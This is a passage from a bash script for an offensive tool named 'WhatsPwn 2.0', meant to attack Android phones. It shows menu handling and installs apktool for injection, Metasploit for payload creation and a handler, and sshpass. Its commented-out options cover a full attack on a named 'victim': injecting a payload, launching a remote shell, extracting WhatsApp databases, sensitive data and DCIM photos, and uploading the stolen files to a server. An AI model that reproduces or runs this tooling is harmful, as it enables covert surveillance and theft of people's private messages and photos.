		3) RESTORE && ATTACKS_INTERFACE ;;
		4) CHKAUTO && EXTRACTION && ATTACKS_INTERFACE ;;
		5) RELAUNCH && ATTACKS_INTERFACE ;;
		r|R) MAIN_INTERFACE ;;
		x|X) exit 0 ;;
		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && ATTACKS_INTERFACE ;;
	esac
}
#######################################################################################################################
#                                                 MAIN CONFIGURATION                                                  #
#######################################################################################################################
# ENABLE CLEANLY EXIT WITH CTRL+C ######## UNFINISHED
trap 'EXITCODE' SIGHUP SIGINT SIGTERM SIGQUIT

# DETERMINE IF USER IS ROOT
if [ "`id -u`" -eq 0 ]; then
	id=root
else
	echo -e "\n${RED}YOU NEED TO BE ROOT.${NONE}"
fi

# DETERMINE DIRECTORY OF THIS SCRIPT.
WDIR="`dirname \"$0\"`"          # RELATIVE PATH
WDIR=$(cd ${WDIR} && pwd)  # ABSOLUTE AND NORMALIZED PATH
# IF ERROR [VARIABLE NOT SET] RETURN ERROR
if [ -z "$WDIR" ] ; then
	echo -e "\n${RED}CANNOT DETERMINE SCRIPT DIRECTORY.${NONE}"
	exit 1
fi

# INSTALL DEPENDENCIES
# INSTALL JAVA 7 FOR apktool
# IF JAVA VERSION IS NOT 7 INSTALLS IT
if [ ! `java -version 2>&1 | awk -F\" '/version/ {print$2}' | grep '1.7' -oE` == '1.7' ]; then
	# INSTALLS JAVA 7 AND UPDATE ALTERNATIVES FOR DUPLICATE CANDIDATES
	apt-get install openjdk-7-jdk && update-alternatives --config java
	# FOLLOW SYMLINKS TO ACTUAL JAVA BINARY AND SET PATH VARIABLE
	JAVA_PATH=$(readlink -f `which java` | rev | cut -b 5- | rev)
	# SET JAVA_HOME ENVIRONMENTAL VARIABLE
	echo "JAVA_HOME=${JAVA_PATH}" >> /etc/environment
	# RELOAD ENVIRONMENTAL VARIABLES
	source /etc/environment
fi

# apktool FOR INJECTION AND HIDDEN
if [ ! `apktool -version | grep "2."` ]; then
	# DOWNLOAD WRAPPER
	wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/bin/apktool
	# DOWNLOAD MAIN JAR
	wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.1.0.jar -O /usr/bin/apktool.jar
	# ALLOW EXECUTION
	chmod +x /usr/bin/apktool /usr/bin/apktool.jar
	# INSTALL COMPATIBILITY WITH 32 BITS MACHINE
	apt-get install lib32stdc++6 lib32ncurses5 lib32z1 > /dev/null
fi

# METASPLOIT FRAMEWORK FOR PAYLOAD CREATION AND HANDLER
if [ ! `which msfvenom` ]; then
	if [ ! `uname -a | grep "kali"` ]; then
		apt-get install metasploit-framework -y
		echo -e "${BOLD}${RED}RUBY WAS NOT FOUND, ${NONE}INSTALLING IT ... ${GREEN}[OK]${NONE}"
	else
		echo -e "${RED}METASPLOIT FRAMEWORK NOT INSTALLED AND YOUR LINUX DISTRO IS NOT KALI, INSTALL IT IF WANT TO USE THE PAYLOAD GENERATOR FEATURES.${NONE}"
	fi
fi

if [ ! `which ruby` ]; then
	apt-get install ruby -y
fi

# SSHPASS
if [ ! `which sshpass` ]; then
	echo -e "${BOLD}${RED}SSHPASS NOT FOUND, ${NONE}INSTALLING IT ... ${GREEN}[OK]${NONE}"
	apt-get install sshpass -y
fi

# LOAD CONFIG FILES
. ${WDIR}/config
. ${WDIR}/server

# CREATE TEMPORARY DIRECTORY
mkdir -p ${WDIR}/tmp/
#######################################################################################################################
#                                                  ARGUMENT PARSER                                                    #
#######################################################################################################################
#if [[ $# > 0 ]]; then
#	option="$1"
#	case "$option" in
#		# FULL ATTACK
#		--full|-f|1) if [[ $# > 1 ]]; then
#						shift
#						while [[ $# > 0 ]]; do
#							option="$1"
#							case "$option" in
#								# SUBOPTIONS FOR FULL ATTACK
#								-p|--payload) PAYLOAD="Y" && shift ;;
#								-e|--extraction) BLACKHOLE="Y" && shift ;;
#								-v|--victim) NAME="$2" && shift 2 ;;
#								-d|--dcim) DCIM="Y" && shift ;;
#								-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
#								-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
#								-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
#								-o|--output) PATH="$2" && shift 2 ;;
#								*) cat ${WDIR}/bin/USAGE && break ;;
#							esac
#						done
#					fi && WHATSPWNREMOTE ;;
#		# RELAUNCH PAYLOAD
#		--relaunch-payload|-r|2) BD2 && cd ${HOME} ;;
#		# LAUNCH REMOTE SHELL IF POSSIBLE, IF NOT LAUNCH LOCAL SHELL
#		--shell|-s|3) SHELL && cd ${HOME} ;;
#		# RESTORE WHATSAPP IN CASE OF ERROR
#		--restore|-w|4) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
#		# EXTRACT SENSITIVE DATA ONLY [NOT WHATSAPP DATABASE]
#		--extraction|-x|5) if [[ $2 == "local" ]]; then # EXTRACTION SUBOPTIONS
#									# LOCAL EXTRACTION
#									if [[ $# > 2 ]]; then
#										shift 2
#										while [[ $# > 0 ]]; do
#											option="$1"
#											case "$option" in
#												-v|--victim) NAME="$2" && shift 2 ;;
#												-d|--dcim) DCIM="Y" && shift ;;
#												-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
#												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
#												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
#												-o|--output) PATH="$2" && shift 2 ;;
#												*) cat ${WDIR}/bin/USAGE && break ;;
#											esac
#										done
#										BHL
#									else
#										BHL
#									fi
#								 fi
#								 # REMOTE EXTRACTION
#								 if [[ $2 == "remote" ]]; then
#								 	if [[ $# > 2 ]]; then
#										shift 2
#										while [[ $# > 0 ]]; do
#											option="$1"
#											case "$option" in
#												-v|--victim) NAME="$2" && shift ;;
#												-d|--dcim) DCIM="Y" && shift ;;
#												-k|--backup) BACKUPZIPNAME="$2" && shift ;;
#												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
#												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
#												-o|--output) PATH="$2" && shift ;;
#												*) cat ${WDIR}/bin/USAGE && break ;;
#											esac
#										done
#										BHRMANUAL
#									else
#										BHRMANUAL
#									fi
#								 fi && cat ${WDIR}/bin/USAGE ;;
#		# UPLOAD EXTRACTED FILES TO SERVER
#		--upload|-u|6) UPLOAD ;;
#		# LAUNCH CLI INTERFACE
#		-i|--interface|8) USEINTERFACE="Y" && MAIN_INTERFACE ;;
#		-v|--version) echo "WhatsPwn 2.0" && exit ;;
#		# ANY OTHER OPTION
#		*) cat ${WDIR}/bin/USAGE ;;
#	esac
#else
#	# IF NO OPTIONS GIVEN
#	cat ${WDIR}/bin/USAGE
#fi
MAIN_INTERFACE
# EXIT WITHOUT ERRORS
exit 0
#######################################################################################################################
